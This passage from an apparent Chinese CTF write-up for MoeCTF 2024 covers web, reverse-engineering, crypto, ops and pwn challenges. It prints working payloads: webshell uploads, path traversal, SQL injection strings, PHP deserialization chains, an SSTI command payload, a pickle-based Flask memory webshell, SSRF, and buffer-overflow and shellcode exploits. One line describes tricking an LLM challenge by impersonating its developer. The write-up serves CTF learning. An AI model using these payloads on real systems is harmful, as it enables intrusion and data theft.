131565609415497588649207556985146740667, 118140388348838985266223643241117982200, 151449885527204880099343472664885565851, 296392921256617994387220911796693904909, 171323803851876663161606688343678019752, 77152982746512263077542395226111426871, 71648764903315646849225859605038798241, 204032734481806785543119754456569617316, 6308687907566364067313782129902290691, 16601010504475415688487155708691097587, 267844409827567109183739120606590016153, 8224746302136608660764206696943998066, 66759882079234093195284745682061177129, 246382951504754280882643835151081337286, 255668159720160142170457715248631352728, 198682585307670767869381177003851088434, 52435298055396076040371814840062860322, 71487031168170283085378067681578926209, 19270201008106231446848331516948751837, 259975200953378762173082382130139147342, 100957428421542421187997144087873975651, 208596806512779765020431672051552927799, 299145970783704112359526450087000033589, 150947534399996219237186223933189906692, 2048564430495506099844799218948689248, 18962488382754079143174369765373573160, 123031997265327646442638576943887737076, 244982544573374061178705105734141424990, 146410849043938910996544914770892579969, 223289253099676841267315311685506771609, 51374350072145272462874563304717832675, 11071799523780604861063183113721965515, 64879815349665030137608387728274669513, 80407660651138778640313857555610913997, 303240361297474032656368918727922343524, 103535171867293830164396688627880762056, 80560992291681297484967629700766125368, 143230791823232014720768325847406122476, 188716605362804777650654549500430035344, 232870220205325961834389425482865329315, 283584919111555062850512413920721407255, 206566027046056486360456937040463884619, 157265544558229360994066706355140059167, 234540100059557817987307855523008271441, 145080729935010940836509908225154438654, 87632901547252991486640361323948527297, 132851295075144433057295220850764336697, 119332580967710872282556206817561230364, 252662535367310697404410284791596079390, 116953597995893914045234747272641030589, 100249498080127826743176896590140549012, 136127222991007877469608037092253387587, 293872159333237281344632727438901916796, 188380258232793584033919525452891729603, 1610116068556601814921533488550773010, 227538093179017809788576278302184723209, 96083211912155805281570727244009758189, 177565192075026414675108774674272650977, 48610376097473152433617435307712235835, 247706157308906487216795222963091222950, 158089460554439410339817265377357657075, 242596743543458727108836420358578527964, 157838486547678450498998359338995593594, 154936428786673098370270244313756793764, 230069001282099253337070315838992422706, 302203905412042965194022309363722872023, 278925578180003228386990239779184911424, 2121847168422140085785053284950978779, 88186566913792352545205577594300112005, 127051055548524716972172930848069016819, 216775577660712694343189516378309335187, 44934779747684486400910901018161470888, 32429597712898788634301884219187226083, 219683174528279300995710495669083670544, 37001671152735870067433052249003677244, 40408367335919429215031155701333780256, 156957056705864208022145617831060134907, 180077610045061934161783737112285900966, 59357544819520045255625797086421901884, 77751400794807935281264495346525107329, 4517615764752715802675887411287287137, 76319782726782483955139757169428276003, 176009402215469456144386392247781430661, 283055695252017869386094188584670242363, 20001716567499724882317501875143788088, 125228382132280749989067609697418628387, 144053090751393640875176862167012247830, 15289106046221987660093620422889539867, 111243866573605033251079958638430165633, 169264885994758018612038619809803723688, 11895954311759483419234457833286931577, 273147053963507607445612310063799123998, 158981773284803069491507978382595811562, 41293513794446810141896116395025053234, 57441237860743029006005815967510568612, 109171476551418034153338841133917497633, 136539712287056106151501004438585146777, 278918550892367788720071091355436733468, 211360251223022250021398148918837686812, 254351242496347083009146404917085951637, 130260153203964833202474997491055897705, 221930288825889900517852991745469270910, 66354211799382156899053592476719001842, 127898620670768976254134750731374490934, 298131830425274848646460016809595859328, 132109510144911727511061804395381822418, 210917766469026421985352121201196497206, 5441137715689271309917542693016936841, 209516950406881264617228336887254107528, 92275151703152148383106907311559718841, 46255650973652148247469464088017660080, 182628529221607295465655096378164148336, 52574278547120304143820897608762444985, 63698472804719856407197390836793525437, 30457182690865024857724004613999433676, 212073418196280214618461610817423630022, 48875930775858981513092672396243080640, 113234797533868946026347891158142991388, 256534108458875318962058222544020064164, 22522715662428558833985333846937440705, 97553118958308509177643330175409499003, 197088081433425221073434635573357125592, 157303116668734020456228309942188293059, 110316346669278795114546305726864504681, 228887397917708007004920589862367347873, 112210930213921962308944716344585917343, 95017760786235266842788931502689331157, 303479014347753799316861720146531596843, 138677197920058856282155251074088437081, 285912176726299387362893467150449209426, 120309832759140713296686339140142433386, 279125897926861811239250830750932241600, 289502053647872994218190050825294169535, 262459212837236162171047720358005836712, 290390838897912466575239533978002826151, 292988850197951752250595007039860868400, 34796135808311610468205608686622819504, 25206338413385638687826160218013868658, 42180804482932648992176529097078580055, 195897225052351816559125785179252565465, 290060760535408066224831756224248708027, 34243626514368402883316460494646065629, 159497726968729366867935528734367549832, 267785772871046662107247674801793846921, 47342328853090920958565777290912999560, 194980176549393239742230551297786993434, 88020247887557921707284362381274951852, 255474100333005567974457204812640809071, 93324791124684170744053910877870176609, 69542826141091170218040988642070014011, 188678529221313094426441439309063681864, 56030802691247887446204447769438570825, 74312207153349149422500961216106557393, 153811406554673020809393530896156460494, 130232956128662318657579623819323546361, 241587755919930468705435097001858194189, 150548598672513907492388638742866339038, 38780469811591978249139697733603217652, 237554030153815380781978075720171312418, 96541634878634946114738393982914693394, 83284071476491638125716901346418260661, 277535192833115492238855935055373371297, 92291115416977028401374199691398676627, 105634075531674200869064066234662065605, 59669321288506854711632528171527160495, 24913178886798791108798737682436779604, 191902245938756063865405758957515936934, 200833770402179506644143905670947994664, 249327029439265065126080906281744759655, 2368715218056973901783211260781833927, 133209645820509536502329231321782644514, 170083361139958757944996287868734988169, 143242266754832252556264383809361085258, 198438133508477313319510861550461456953, 226416574016152349355240811564666677855, 131995850810926550122710727062184985075, 206211971624338783828953817981719254101, 95022339713176475801874420969255633409, 39239785273544046574575511790952158726, 6761950061835300419279903725369635970, 160849355761964483498641169767552240859, 44129081383649229398785011378026849128, 116611486899507912253396257166983831123, 102748760887182142877957834312659347601, 100973668783270797012352094429175531207, 110548564207426762905750742091610942634, 205424582078496700107783237952155124442, 210932790939110827079725957948996247757, 54413304958149902897514912130730392489, 181315803651356180100745517014898850424, 183346938138867395962624263310328788228, 133507835720650939452036529283981720094, 244220649646693249242542702657146329679, 111814540087048948955999016117121133729, 210757262617434713384638061648414714521, 31712005436857719771604404352654183712, 299210790483067037892753875410776716305, 34216439939230284515095120240039231491, 246820219620854547856488049434101568744, 298588211282375015522910461809769779222, 53320103067319149790078933423751044737, 164977173816081040725650999609390274279, 234782977255751828939911143180631329578, 61521250269407451751766565186333346163, 119529895182262920689181379893081203421, 154588465395872896210615516764102943961, 153034255402211966905777978896125271527, 65497510688725487475002809757533544579, 76824114145168270682129892469858568031, 218064880554787781811938382300930885801, 196850060586188141836799779247809406205, 176023892018381269394229104598502170110, 32491776807255207889633110137157036238, 41150198830446315717651890670848632754, 260753023840843193587871227195221789744, 48345408122882987831052823644867513356, 80045935233531979816083287928071697883, 131878104259519592871955471048058374000, 15534379538690707223440448056318568055, 131291412522855581131329717355299310716, 37018675243998552749630837151597269431, 144343493968520204610097930388908478903, 67236444178494959708570043908346657722, 102574100831305499879105427279131095784, 249069309513964056714882166119752611668, 210718130986716991560768592011623825976, 266242407402824082344585571101593909650, 205203132247422842477137158586071965100, 301157372202750742637385626243753030679, 40886620741595313792996852647181029560, 253361171396328884567373946949359324229, 50071128101197582041162516700015376269, 106002417001877546867386840932652850816, 224086864980106045542532841236299648038, 42103921294151508500634063253613482845, 49777138159264482913170680298952908154, 24324534484842395819609478778764950811, 204106593629836179932302789646808274058, 266707066043760482642609614924857456238, 18723835069315957900598472598907945204, 244338819469013923747256697307964210342, 36296287172854997655950896217230267111, 292888671179451539882069138267865661448, 287111415651274690627399445990831389362, 79940439572496625318602146625920961720, 288270505176661814341807462681727466925, 153921178962139214138689743179633342125, 263564317934507756965522450042219801757, 197993323684501153884855839599466707355, 72143993205715719344183507132882267579, 67511075584002491895239101559049103979, 231396344630318648781207380069016790960, 268490084177254392405211695854127631350, 45968181401712207064942095991325993181, 34472329776995578971329318400545600788, 112967316661320871429337739209994987784, 209508577387521479468956337084132598710, 194445696189141465862938111222574992064, 229942079198360020568341753187100646148, 47944382795398541172186729027517882654, 54806201653083974379270761512143387910, 93457347627015900562505045196097224001, 152033139738914238723733340538181549419, 123719026823969669345162603978875451754, 154704533151410142607151617227929824563, 32428281285686815618553795197210513625, 265229864831280807254743597731258298440, 14904705423314872103792141735779112532, 177442398230615511669857060547212895616, 144918716871520627851549439448066637518, 203019416536984157536348865479415073573, 288452420706913930307744155709559750006, 282516471994395201735206793889605510595, 150722332251745138694381051866105655391, 234504581837296595003379465512031425988, 44178766618576668748878202507789103195, 217129489675072754441642067295058817201, 245087939287551829934600756568137757979, 240954534396950014938672406581264782638] decrypted_flag = decrypt_flag(ciphertext, p, a) print(decrypted_flag) Web渗透测试与审计 Web渗透测试与审计入门指北 利用phpstudy进行搭建，得到flag\n弗拉格之地的入口 进入题目，hint是爬虫，联想到robots.txt，打开得到/webtutorEntry.php,进入页面得到flag\nmoectf{CONGr@Tu14TioN-foR-KNOwlNG-ROBOtS_txT10e7d}\nez_http moectf{y0u-4RE_ReA1lY-re@LlY_verY_c1EVEr!!!20ed}\n垫刀之路01: MoeCTF？启动！ 正常流程\nls / -\u003ecat /flag #提示在环境里 -\u003e输入env 垫刀之路02: 普通的文件上传 提示和01一样应该也在env里\n传个一句话木马，然后打开env即可\n垫刀之路03: 这是一个图床 加了图片限制，写一个一句话，末尾改成jpg，抓包再把jpg改成php，执行system(’env’);就行了\n垫刀之路04: 一个文件浏览器 考察的知识点是目录遍历。简单的翻了一下不在目前的目录下通过../往上查找,(需要url编码),找到flag那一层，进去提示不在该文件下\n根据moejail_lv1的提示猜测在tmp的目录下,里面有flag，得到答案。\n?path=../../../..//tmp/flag 垫刀之路05: 登陆网站 先想到是尝试爆破的，突然下面跳出以前sql注入的记录\n试了一下就出来了，进行了简答的截取绕过\na' or 1=1 # 垫刀之路06: pop base mini moe 直接上wp\n\u003c?php class A { private $evil='cat /flag'; public $a; } class B { private $b= 'system'; } $exp = new A(); $exp-\u003ea = new B(); $serialized_data = serialize($exp); echo \"?data=\".urlencode($serialized_data) ; 这里微调一下代码，$a前面的private需要改成public，要不然调用不了$a.\n垫刀之路07: 泄漏的密码 考察的Flask，得到pin进入console里面\n\u003e\u003e\u003eos.listdir() ['__pycache__', 'flag', 'app.py', 'getPIN.py', 'static', 'templates'] \u003e\u003e\u003e with open('flag', 'r') as f: print(f.read().strip()) moectf{DONT_usIng-fLasK_6y_DE6UG_MOd_aNd-le4k-YOuR_p1nb} 静态网页 这题需要抓包看回显，orz我之前一直在看前端\n看/api/get/?id=1-53可以得到具体的php\n进去是一个MD5绕过\n原来想着自绕过的，但是没有办法\n后来直接a=0a，b[0a]=md5(0a)即可绕过，思路没转过来\nwho’s blog? fenjing一把梭得到答案\n?id={{cycler.next.__globals__.__builtins__.__import__('os').popen('env').read()}}; ProveYourLove 方法1：抓包，发包得到flag\n方法2：不会第一种可以手动删cookie，慢慢按\n方法3：我做的时候没想到发包，在对应前端检测的地方打断点控制台绕过了，不推荐\n弗拉格之地的挑战 第0层：直接进/flag1ab.html\n第一层：看源码得到提示和下一层\n第二层：如图所示\nflag2 e0FmdEV nextpage /flag3cad.php 第三层:\n?a=a\rb=a\rcookie:verify=admin flag3: yX3RoMXN\n/flag4bbc.php\n第四层：\n控制台手动触发打断点\nvar event = new MouseEvent('click', {\r'view': window,\r'bubbles': true,\r'cancelable': true\r});\rvar button = document.getElementById(\"scope\").getElementsByTagName(\"button\")[0];\rbutton.id = 9; // 首先将其ID设置为9\rbutton.dispatchEvent(event); // 手动触发点击事件 flag4: fdFVUMHJ\r前往：/flag5sxr.php 第五层：\n提示框输入相应的内容，控制台输入content=‘aaa’，对应内容打断点\nflag5: fSV90aDF\n第六层：?moe=FLAG\npost:moe=1\nflag6: rZV9VX2t\n第七层：\nwhat=system(‘cat /f*’);\n得到flag：rbm93X1dlQn0=\n最后七层的flag拼接base64得到答案\nbW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=\nmoectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}\nmoe pop 先上源码\n\u003c?php class class000 { private $payl0ad = 0; protected $what; public function __destruct() { $this-\u003echeck(); } public function check() { if($this-\u003epayl0ad === 0) { die('FAILED TO ATTACK'); } $a = $this-\u003ewhat; $a(); } } class class001 { public $payl0ad; public $a; public function __invoke() { $this-\u003ea-\u003epayload = $this-\u003epayl0ad; } } class class002 { private $sec; public function __set($a, $b) { $this-\u003e$b($this-\u003esec); } public function dangerous($whaattt) { $whaattt-\u003eevvval($this-\u003esec); } } class class003 { public $mystr; public function evvval($str) { eval($str); } public function __tostring() { return $this-\u003emystr; } } if(isset($_GET['data'])) { $a = unserialize($_GET['data']); } else { highlight_file(__FILE__); } 进行简单的代码审计，从后往前推\nclass003有eval函数可以进行利用,class002中调用dangerous函数可以利用拼接，想引用dangerous可以给class001的payl0ad进行赋值利用a来new一个class002,要使用invoke函数的话，可以看class000,首先令payl0ad=000,成功正常的，成功给what赋值new class001\n大题的思路就是这样正推的话直接上payload，为了连接起来，部分内容需要修改成public\nexp:\n$exp = new class000; $exp-\u003ewhat=new class001; $exp-\u003ewhat-\u003epayl0ad='dangerous'; $exp-\u003ewhat-\u003ea=new class002; $exp1=new class003; $exp1-\u003emystr='phpinfo();'; $exp-\u003ewhat-\u003ea-\u003esec = $exp1; echo urlencode(serialize($exp)); payl0ad和sec我都改成public了，最后可以在phpinfo里面找到flag,ctrl+f搜索moe\n勇闯铜人阵 😋之前自己敲完一个代码之后就了解了一些基础了，晚上敲一会出来了，自己代码能力还是要练一下的,关键点可能就是session保持持续会话，我第一次尝试的时候没用到session，第二次是代码逻辑问题\nimport requests from bs4 import BeautifulSoup import re url = 'http://127.0.0.1:59353/' session = requests.Session() response = session.get(url) post_data = {'player': \"123\", 'direct': \"弟子明白\"} post_response = session.post(url, data=post_data) def get_direction(number): directions = { 1: \"北方\", 2: \"东北方\", 3: \"东方\", 4: \"东南方\", 5: \"南方\", 6: \"西南方\", 7: \"西方\", 8: \"西北方\" } return directions.get(number, \"无效的方向\") def extract(html_content): tag = BeautifulSoup(html_content, 'html.parser').find('h1', id='status') return tag.text if tag else \"状态未找到\" def extract_numbers(text): return [int(num) for num in re.findall(r'\\d+', text)] for i in range(5): # 提取状态文本 status_text = extract(post_response.text) print(f\"状态: {status_text}\") numbers = extract_numbers(status_text) count = len(numbers) if count == 1: ans = f\"{get_direction(numbers[0])}\" else: ans = \"，\".join([f\"{get_direction(num)}一个\" for num in numbers]) print(f\"方向: {ans}\") payload = {'player': \"123\", 'direct': ans} post_response = session.post(url, data=payload) status_text = extract(post_response.text) print(f\"新的状态: {status_text}\") 电院_Backend 过了一阵子才写，其实就是简单的sql注入，只是不怎么遇到sql的题目，所以也就不怎么会写了\ntest@example.com' UNION SELECT null, null, null -- 进行绕过得到flag\nImageCloud前置 其实应该算在ssrf里面吧，利用?url=file:///etc/passwd,读取到flag\nImageCloud 一开始尝试了图片一句话和vps外带执行命令，完全就是逻辑方向错了。\n根据hint的提示给的是损坏的，但是容器是好的，再细看app2.py的代码（我一开始就没看\n可以得出其实容器开了两个端口？利用**?url=http://127.0.0.1:xxxx/image/flag.jpg**，然后结合bp快速扫一下5001-6000的端口\n就找到flag.jpg所在位置，图片上有flag\nPetStore(复现) 是个pickle的题目，写的时候没有往内存马那边想后来请教学长告诉了可以直接打个🐎进去，因为种种原因直到结束都没再写，复现一下。以下是一开始的个人思路。\n关键的代码定位是import_pet部分的代码\ndef import_pet(self, serialized_pet) -\u003e bool: try: pet_data = base64.b64decode(serialized_pet) pet = pickle.loads(pet_data) if isinstance(pet, Pet): for i in self.pets: if i.uuid == pet.uuid: return False self.pets.append(pet) return True return False except Exception as e: return False def export_pet(self, pet_uuid) -\u003e str | None: pet = self.get_pet(pet_uuid) if pet is not None: self.pets.remove(pet) serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(\"utf-8\") return serialized_pet return None 要反序列化读取env得到flag，dockerfile是写在env里的，容器不出网，题目容器侧无法主动发起与外部网络的连接。\n测试了正常的通过uuid收养一个新宠物正常通过然后改成__reduce__想读取env，但是读取不通\nimport pickle import base64 import uuid import os class Pet: def __init__(self, name, species, uuid): self.name = name self.species = species self.uuid = uuid #def __repr__(self): # return f\"Pet(name={self.name}, species={self.species}, uuid={self.uuid})\" def __reduce__(self): return (os.system, (\"env\",)) #return eval,(\"__import__('os').system('env')\",) uuid = str(uuid.uuid4()) print(uuid) a= pickle.dumps(pet) print(a) encoded_pet = base64.b64encode(a).decode('utf-8') print(f\"Encoded Payload: {encoded_pet}\") (ps:想想其实有什么空白文件把内容打印到上面也行的，还是老老实实打个内存马吧)然后是正常的推进思路打个内存马进去\nimport pickle import base64 class Pet: def __reduce__(self): cmd_injection = \"__import__('os').popen(request.args.get('cmd')).read()\" return eval, (\"__import__('sys').modules['__main__'].__dict__['app']\" \".before_request_funcs.setdefault(None, []).append(lambda :\" + cmd_injection + \")\",) # 创建类实例并序列化为pickle，再进行base64编码 a = Pet() b = pickle.dumps(a) print(base64.b64encode(b).decode()) 然后执行?cmd=env可以读取flag\nRe: 从零开始的 XDU 教书生活(复现) 困惑点在我怎么得到所有学生的学号以及密码登陆，因为是python写还需要分析加密逻辑，以及由于是动态的二维码图片，我想的是一个程序跑登陆学生，一个程序教师端登陆不断的发包请求识别下载二维码以保证图片的，可能确实是思路发散的太多了\n代码思路是首先，使用老师的账号登录并获取二维码，然后退出登录。用每个学生的账号进行登录，使用事先获取的签到 URL 来完成签到。xxx需要自己填对应内容\nimport requests url = 'xxx' teacher_phone = '10000' password = teacher_phone QR_code_params = { \"id\": \"xxx\", \"c\": \"xxx\", \"enc\": \"xxx\", \"DB_STRATEGY\": \"PRIMARY_KEY\", \"STRATEGY_PARA\": \"id\" } # 持续化 session session = requests.session() def teacher_login(): try: response = session.post(f\"{url}/fanyalogin\", data={ \"uname\": teacher_phone, \"password\": password }) response_data = response.json() if response_data.get('status'): print(\"Teacher logged in successfully.\") else: raise Exception(\"Teacher login failed.\") except Exception as e: print(f\"Error during teacher login: {e}\") raise def get_student_account(): try: response = session.get(f\"{url}/widget/sign/pcTeaSignController/showSignInfo1\") students = response.json().get(\"data\", {}).get(\"changeUnSignList\", []) return [student[\"uid\"] for student in students] except Exception as e: print(f\"Error fetching student account: {e}\") return [] def student_login(phone): try: response = session.post(f\"{url}/fanyalogin\", data={ \"uname\": str(phone), \"password\": str(phone) }) return response.json().get('status', False) except Exception as e: print(f\"Error during student login for {phone}: {e}\") return False def scan_QR(): try: response = session.get(f\"{url}/widget/sign/e\", params=QR_code_params) return response.text except Exception as e: print(f\"Error scanning QR code: {e}\") return \"\" def main(): teacher_login() student_phones = get_student_account() if not student_phones: print(\"No students to process.\") return successful_sign_ins = 0 for index, phone in enumerate(student_phones, start=1): print(f\"Processing student {phone} (#{index})...\") if student_login(phone): print(f\"Student {phone} logged in successfully.\") result = scan_QR() print(f\"Scan result for student {phone}: {result}\") if \"签到成功\" in result: successful_sign_ins += 1 # Clear session cookies to prevent carry-over issues session.cookies.clear() else: print(f\"Student {phone} login failed.\") print(f\"All students processed. Total successful sign-ins: {successful_sign_ins}.\") if successful_sign_ins == len(student_phones): print(\"All students have signed in successfully.\") else: print(f\"{len(student_phones) - successful_sign_ins} students failed to sign in.\") if __name__ == \"__main__\": main() smbms(复现) 这题没看，做起来其实主要就是sql这边的注入慢慢的调试吧默认是admin然后bp来fuzz一下密码，得到1234567\n然后就是慢慢调试sqlmap了，最后的命令如图\n开发与运维基础 运维入门指北 find . -name \"*.bak\" -type f -exec rm -f {} + find . -name \"*.xml\" -type f -exec sh -c 'for file; do mv -- \"$file\" \"${file%.xml}.html\"; done' _ {} + find . -type f | while read -r file; do filename=$(basename \"$file\"); dir1=${filename:0:2}; dir2=${filename:2:2}; mkdir -p \"$dir1/$dir2\"; mv \"$file\" \"$dir1/$dir2/$filename\"; done su toor mv * /var/www/html/ grep 'flag' /var/log/nginx/access.log 哦不！我的libc！ 用xshell进行连接，简单测试一下常规的语句都不能用了\n使用Shell 内建命令\nwhile IFS= read -r line; do echo \"$line\"; done \u003c /flag.txt 得到flag\n大语言模型应用安全 Neuro? 先我是vedal回答，然后告诉他亲自好像（二次认证好像,不太记得了\n并非助手 尝试了一会正常的是不能输入的，表情包可以，联想到flag就是旗子，输入🚩得到flag\n逆向工程 逆向工程入门指北 代码放在c环境里面运行就行\nxor 进行简单的异或就行\nls=[0x49, 0x4B, 0x41, 0x47, 0x50, 0x42, 0x5F, 0x41, 0x1C, 0x16, 0x46,0x10, 0x13, 0x1C, 0x40, 9, 0x42, 0x16, 0x46, 0x1C, 9, 0x10,0x10,0x42, 0x1D, 9, 0x46, 0x15, 0x14,0x14, 9, 0x17, 0x16, 0x14,0x41, 0x40,0x40, 0x16, 0x14, 0x47, 0x12, 0x40, 0x14, 0x59] s='' for i in ls: s+=chr(i^0x24) print(s) TEA #include void decrypt(unsigned int \u0026v4, unsigned int \u0026v5) { unsigned int delta = 0x9E3779B9; // 固定值 1640531527 unsigned int v3 = delta * 32; // 反向过程从最大值开始 int v6 = 32; while (v6 \u003e 0) { v5 -= ((v4 + v3) ^ ((v4 \u003c\u003c 4) + 1634038898)) ^ ((v4 \u003e\u003e 5) + 1634038904); v4 -= ((v5 + v3) ^ ((v5 \u003c\u003c 4) + 1702060386)) ^ ((v5 \u003e\u003e 5) + 1870148662); v3 -= delta; // 解密时减少 delta v6--; } } int main() { unsigned int v4 = 676078132; // xxxxxxxx 部分解密后的值 unsigned int v5 = 957400408; // zzzz 和 yyyy 部分解密后的值 // 调用解密函数 decrypt(v4, v5); // 提取出 yyyy 和 zzzz 部分 unsigned int v11 = (v5 \u003e\u003e 16) \u0026 0xFFFF; // yyyy 部分 unsigned int v9 = v5 \u0026 0xFFFF; // zzzz 部分 // 输出结果 std::cout \u003c\u003c \"xxxxxxxx = \" \u003c\u003c std::hex \u003c\u003c v4 \u003c\u003c std::endl; std::cout \u003c\u003c \"yyyy = \" \u003c\u003c std::hex \u003c\u003c v11 \u003c\u003c std::endl; std::cout \u003c\u003c \"zzzz = \" \u003c\u003c std::hex \u003c\u003c v9 \u003c\u003c std::endl; std::cout \u003c\u003c \"moectf{\" \u003c\u003c std::hex \u003c\u003c v4 \u003c\u003c \"-\" \u003c\u003c v11 \u003c\u003c \"-\" \u003c\u003c v9 \u003c\u003c \"-9c42-caf30620caaf}\" \u003c\u003c std::endl; return 0; } upx 先使用upx工具先脱壳，再进行ida的正常阅读\n里面直接由flag\nmoectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}\nupx-revenge ESP x64dbg手动脱壳一下用ida64打开得到flag\ndynamic 下载打开文件，按shift+f12找到对应的页面，找到what happened to my flag?\n里面有一段逻辑进行REencrypto之后就变了，给what那行打断点，f9动调得到flag\nd0tN3t 用dnSpy打开定位到关键代码，然后写解密脚本\n#include #include int main() { std::vector\u003cuint8_t\u003e array = { 173, 146, 161, 174, 132, 179, 187, 234, 231, 244, 177, 161, 65, 13, 18, 12, 166, 247, 229, 207, 125, 109, 67, 180, 230, 156, 125, 127, 182, 236, 105, 21, 215, 148, 92, 18, 199, 137, 124, 38, 228, 55, 62, 164 }; std::string flag; for (int i = 0; i \u003c array.size(); ++i) { char decrypted_char = static_cast\u003cchar\u003e((array[i] ^ (i * i)) ^ 114) - 114; flag += decrypted_char; } std::cout \u003c\u003c \"Decrypted Flag: \" \u003c\u003c flag \u003c\u003c std::endl; return 0; } 逆向工程进阶指北 #include #include using namespace std; int find(int i, unsigned int* arr) { for (int j = 33; j \u003c= 126; j++) for (int k = 33; k \u003c= 126; k++) for (int l = 33; l \u003c= 126; l++) for (int m = 33; m \u003c= 126; m++) { unsigned char temp[] = { (unsigned char)j, (unsigned char)k, (unsigned char)l, (unsigned char)m }; unsigned int* p = (unsigned int*)temp; if (((*p * 0xccffbbbb + 0xdeadc0de) ^ 0xdeadbeef + 0xd3906) == arr[i]) { cout \u003c\u003c (char)j \u003c\u003c (char)k \u003c\u003c (char)l \u003c\u003c (char)m; return 0; } } return -1; // 返回-1表示没有找到匹配的字符组合 } int main() { unsigned int arr[] = { 0xb5073388, 0xf58ea46f, 0x8cd2d760, 0x7fc56cda, 0x52bc07da, 0x29054b48, 0x42d74750, 0x11297e95, 0x5cf2821b, 0x747970da, 0x64793c81 }; for (int i = 0; i \u003c 11; i++) { if (find(i, arr) == -1) { cout \u003c\u003c \"No match found for arr[\" \u003c\u003c i \u003c\u003c \"]\\n\"; } } cout \u003c\u003c endl; return 0; } SecretModule 下载得到文件，打开看customize.sh，提示base64，解密后下载文件，得到以下内容\ntestk() { echo \"Welcome to the Secret module!But before you begin,you need to prove your self.\" (/system/bin/getevent -lc 1 2\u003e\u00261 | /system/bin/grep VOLUME | /system/bin/grep \" DOWN\" \u003e $MODPATH/events) || return 1 return 0 } choose() { while true; do /system/bin/getevent -lc 1 2\u003e\u00261 | /system/bin/grep VOLUME | /system/bin/grep \" DOWN\" \u003e $MODPATH/events if (`cat $MODPATH/events 2\u003e/dev/null | /system/bin/grep VOLUME \u003e/dev/null`); then break fi done if (`cat $MODPATH/events 2\u003e/dev/null | /system/bin/grep VOLUMEUP \u003e/dev/null`); then echo \"114514\" else echo \"1919810\" fi } if testk; then ui_print \"Great! Now enter the secret.\" else ui_print \"Legacy Device. Use a newer device to do this challenge\" exit fi concatenated=\"\" for i in 1 2 3 4 5 6 7 do result=$(choose) concatenated=\"${concatenated}${result}\" done input_str=$(echo -n $concatenated | md5sum | awk '{print $1}') sec=\"77a58d62b2c0870132bfe8e8ea3ad7f1\" if test $input_str = $sec then echo 'You are right!Flag is' echo \"moectf{$concatenated}\" else echo 'Wrong. Try again.' exit gpt帮帮我，写出解密脚本\nimport hashlib import itertools def md5_hash(s): return hashlib.md5(s.encode()).hexdigest() # 目标哈希值 target_hash = \"77a58d62b2c0870132bfe8e8ea3ad7f1\" # 定义两个可能的结果 options = [\"114514\", \"1919810\"] # 枚举所有可能的组合，7个位置，每个位置有两个可能的选择 for combo in itertools.product(options, repeat=7): # 组合成一个字符串 concatenated = \"\".join(combo) # 计算其 MD5 哈希值 hashed = md5_hash(concatenated) # 如果哈希值匹配目标 if hashed == target_hash: print(f\"找到匹配的输入序列: {combo}\") print(f\"输入字符串: {concatenated}\") print(f\"Flag 是: moectf{{{concatenated}}}\") break rc4 #include #include typedef unsigned longULONG; /*初始化函数*/ void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i\u003c256; i++) { s[i] = i; k[i] = key[i%Len]; } for (i = 0; i\u003c256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[i]和s[j] s[j] = tmp; } } /*加解密*/ void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len) { int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k\u003cLen; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[x]和s[y] s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; } } int main() { unsigned char flag[]= { 0xA7,0x1A,0x68,0xEC,0xD8,0x27,0x11,0xCC,0x8C,0x9B,0x16,0x15,0x5C,0xD2,0x67,0x3E,0x82,0xAD,0xCE,0x75,0xD4, 0xBC,0x57,0x56,0xC2,0x8A,0x52,0xB8,0x6B,0xD6,0xCC,0xF8,0xA4,0xBA,0x72,0x2F,0xE0,0x57,0x15,0xB9,0x24,0x11 }; unsigned char key[]=\"RC4_1s_4w3s0m3\"; unsigned char s[256]={0}; rc4_init(s,key,14); rc4_crypt(s,flag,42); int i; for(i=0;i\u003c=42;i++){ printf(\"%c\",flag[i]); } } 二进制漏洞审计 二进制漏洞审计入门指北 nc连接一下就出来了\nNotEnoughTime 是个数学题，写个脚本交互一下吧\nfrom pwn import * from Crypto.Util.number import * import re def work(io): # 初始交互，发送设置值 io.recvuntil(b\"ones.\") io.sendlineafter(b'=', b'2') io.sendlineafter(b'=', b'0') # 进入到数学表达式部分 io.recvuntil(b'PREPARED!') a = io.recvuntil(b'=') # 循环处理数学表达式 while True: # 清理接收到的表达式，移除空白字符并替换除法符号 aa = re.sub(r'[ \\t\\n\\r=]+', '', a.decode()).replace('/', '//') # 计算表达式的结果 ans = eval(aa) print(f\"Calculated Answer: {ans}\") # 将计算结果发送回服务器 io.sendline(str(ans).encode()) try: # 接收下一个表达式 a = io.recvuntil(b'=') except EOFError: # 如果没有更多表达式则跳出循环 break # 连接到远程服务，端口为62593 io = remote('192.168.114.1', 63631) # 执行工作函数 work(io) # 保持交互 io.interactive() no_more_gets from pwn import * def exp(io): io.recvuntil(b'out.') # 接收直到指定字符串 payload = b'A' * (0x50 + 0x8) + p64(0x40101a) + p64(0x401176) # 构造 payload io.sendline(payload) # 发送 payload # 使用正确的 IP 地址 io = remote('192.168.114.1', 63945) # 建立远程连接 exp(io) # 执行 exp 函数 io.interactive() # 进入交互模式 leak_sth from pwn import * p=remote(\"192.168.114.1\",56731) payload=b\"%7$p\" p.sendline(payload) p.recvuntil(b\"Your name:\\n0x\") data=p.recv(8) print(\"data=\",data) data=int(data,16) print(\"data2=\",hex(data)) p.sendline(str(data)) p.interactive() 这是什么？shellcode！ from pwn import * context(os='linux',arch='amd64',log_level='debug') p = remote('192.168.114.1',53436) shellcode=\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\" p.send(shellcode) p.interactive() ","wordCount":"9120","inLanguage":"zh-cn","datePublished":"2024-10-12T00:00:00Z","dateModified":"2024-10-12T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/ctf/moectf2024/"},"publisher":{"@type":"Organization","name":"0raN9e's 